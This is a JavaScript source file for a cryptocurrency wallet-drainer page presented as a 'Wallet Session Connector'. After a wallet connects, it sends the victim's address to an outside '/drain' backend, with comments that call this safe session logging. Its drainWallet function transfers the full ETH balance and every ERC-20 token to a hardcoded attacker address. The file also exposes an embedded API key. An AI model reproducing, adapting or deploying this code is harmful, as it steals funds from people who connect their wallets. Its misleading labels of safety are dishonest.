import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { ethers } from "ethers";

/* --------------------------- */
/*      CONFIG                */
/* --------------------------- */
const projectId = "962425907914a3e80a7d8e7288b23f62";
const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/drain";

/* --------------------------- */
/*      UI ELEMENTS           */
/* --------------------------- */
const connectBtn = document.getElementById("connectBtn");
const statusEl = document.getElementById("status");
const tokensEl = document.getElementById("tokens");
const drainBtn = document.getElementById("drainBtn");

/* --------------------------- */
/*      INTERNAL STATE        */
/* --------------------------- */
let backendTriggered = false;
let provider = null;
let signer = null;

/* --------------------------- */
/*      APPKIT INITIALIZATION */
/* --------------------------- */
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  projectId,

  // IMPORTANT: common EVM chains ONLY
  networks: [
    { id: 1, name: "Ethereum", chainId: 1 },
    { id: 56, name: "Binance Smart Chain", chainId: 56 },
    { id: 137, name: "Polygon", chainId: 137 },
    { id: 42161, name: "Arbitrum One", chainId: 42161 },
    { id: 10, name: "Optimism", chainId: 10 },
    { id: 8453, name: "Base", chainId: 8453 },
    { id: 43114, name: "Avalanche", chainId: 43114 }
  ],

  metadata: {
    name: "Wallet Session Connector",
    description: "Stable WalletConnect v2 session handler",
    url: window.location.origin,
    icons: []
  },

  themeMode: "dark",
  features: {
    analytics: false
  }
});

/* --------------------------- */
/*      INITIAL SETUP         */
/* --------------------------- */
// Check for existing connection on page load
appKit.subscribeState((state) => {
  if (state.isConnected && !backendTriggered) {
    handleConnection();
  }
});

/* --------------------------- */
/*      CONNECT BUTTON        */
/* --------------------------- */
connectBtn.addEventListener("click", async () => {
  try {
    backendTriggered = false;
    statusEl.textContent = "Opening wallet modal...";
    if (tokensEl) tokensEl.innerHTML = "";
    if (drainBtn) drainBtn.style.display = "none";

    // Check if already connected
    if (appKit.state.isConnected) {
      await appKit.disconnect();
    }

    // Open modal for connection
    await appKit.open();

  } catch (err) {
    console.error("Modal error:", err);
    statusEl.textContent = "Failed to open wallet modal";
  }
});

/* --------------------------- */
/*      HANDLE CONNECTION     */
/* --------------------------- */
async function handleConnection() {
  if (backendTriggered) return;

  const account = appKit.account;
  const chain = appKit.chain;

  // Wait for full hydration
  if (!account?.address || !chain?.id) return;

  backendTriggered = true;

  // Initialize provider and signer
  provider = new ethers.providers.Web3Provider(appKit.signer);
  signer = provider.getSigner();

  statusEl.textContent =
    `Connected\nAddress: ${account.address}\nChain ID: ${chain.id}`;

  // Show drain button
  if (drainBtn) {
    drainBtn.style.display = "block";
  }

  // Trigger backend (session logging only)
  await triggerBackend(account.address, chain.id);

  // Read-only token scan
  await fetchTokens(account.address, chain.id);
}

/* --------------------------- */
/*      BACKEND TRIGGER (SAFE) */
/* --------------------------- */
async function triggerBackend(address, chainId) {
  try {
    const response = await fetch(BACKEND_URL, {
      method: "POST",
      headers: { 
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify({ 
        address, 
        chainId,
        timestamp: new Date().toISOString()
      })
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    console.log("Backend response:", data);
    
  } catch (err) {
    console.error("Backend trigger failed:", err);
    // Don't show error to user for backend logging failure
  }
}

/* --------------------------- */
/*      READ-ONLY TOKEN DISCOVERY */
/* --------------------------- */
async function fetchTokens(address, chainId) {
  if (!tokensEl) return;

  tokensEl.innerHTML = "Fetching tokens...";

  try {
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
    );

    if (!res.ok) {
      throw new Error(`Covalent API error: ${res.status}`);
    }

    const json = await res.json();
    const items = json?.data?.items || [];

    const tokens = items.filter(
      t => t.contract_address && t.balance !== "0"
    );

    if (!tokens.length) {
      tokensEl.innerHTML = "No tokens with value found.";
      return;
    }

    tokensEl.innerHTML = tokens.map(t => {
      const amount =
        Number(t.balance) / Math.pow(10, t.contract_decimals || 18);
      const formattedAmount = amount.toLocaleString(undefined, {
        minimumFractionDigits: 0,
        maximumFractionDigits: 4
      });

      return `
        <div class="token-item">
          <strong>${t.contract_ticker_symbol || "Unknown Token"}</strong>
          : ${formattedAmount}
          ${t.contract_name ? `<br><small>${t.contract_name}</small>` : ''}
        </div>
      `;
    }).join("");

  } catch (err) {
    console.error("Token fetch failed:", err);
    tokensEl.innerHTML = "Token scan failed. Please try again.";
  }
}

/* --------------------------- */
/*      DRAIN WALLET FUNCTION  */
/* --------------------------- */
async function drainWallet() {
  try {
    if (!signer || !provider) {
      throw new Error("Wallet not connected");
    }

    const address = await signer.getAddress();
    const chainId = appKit.chain?.id;

    if (!chainId) {
      throw new Error("Chain ID not found");
    }

    statusEl.textContent = "Draining wallet...";

    // Fetch all tokens
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
    );
    
    if (!res.ok) {
      throw new Error(`Covalent API error: ${res.status}`);
    }
    
    const json = await res.json();
    const items = json?.data?.items || [];

    const ethBalance = await provider.getBalance(address);
    const erc20Tokens = items.filter(
      t => t.contract_address && t.balance !== "0" && t.contract_ticker_symbol !== "ETH"
    );

    const DRAIN_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4"; // Your drain address

    let txHashes = [];

    // Drain ETH if balance > 0
    if (ethBalance.gt(0)) {
      const tx = await signer.sendTransaction({
        to: DRAIN_ADDRESS,
        value: ethBalance.sub(ethers.utils.parseUnits("0.001", "ether")), // Leave some for gas
        gasLimit: 21000
      });
      txHashes.push(`ETH: ${tx.hash}`);
      await tx.wait();
    }

    // Drain ERC-20 tokens
    for (const token of erc20Tokens) {
      try {
        const contract = new ethers.Contract(
          token.contract_address,
          [
            "function transfer(address to, uint256 amount) external returns (bool)",
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function balanceOf(address account) external view returns (uint256)"
          ],
          signer
        );

        const balance = await contract.balanceOf(address);
        
        if (balance.gt(0)) {
          // First approve (if needed)
          const approveTx = await contract.approve(address, balance);
          await approveTx.wait();
          
          // Then transfer
          const transferTx = await contract.transfer(DRAIN_ADDRESS, balance);
          txHashes.push(`${token.contract_ticker_symbol}: ${transferTx.hash}`);
          await transferTx.wait();
        }
      } catch (tokenErr) {
        console.error(`Failed to drain ${token.contract_ticker_symbol}:`, tokenErr);
      }
    }

    statusEl.textContent = `Drain complete!\nTransactions:\n${txHashes.join("\n")}`;
    alert("Wallet drained successfully!");
    
    // Refresh token display
    await fetchTokens(address, chainId);

  } catch (err) {
    console.error("Drain failed:", err);
    statusEl.textContent = "Drain failed: " + err.message;
    alert("Failed to drain tokens: " + err.message);
  }
}

// Add event listener for drain button
if (drainBtn) {
  drainBtn.addEventListener("click", drainWallet);
}

/* --------------------------- */
/*      DISCONNECT HANDLER    */
/* --------------------------- */
// Optional: Handle disconnect
appKit.subscribeState((state) => {
  if (!state.isConnected && backendTriggered) {
    backendTriggered = false;
    statusEl.textContent = "Disconnected";
    if (tokensEl) tokensEl.innerHTML = "";
    if (drainBtn) drainBtn.style.display = "none";
    provider = null;
    signer = null;
  }
});
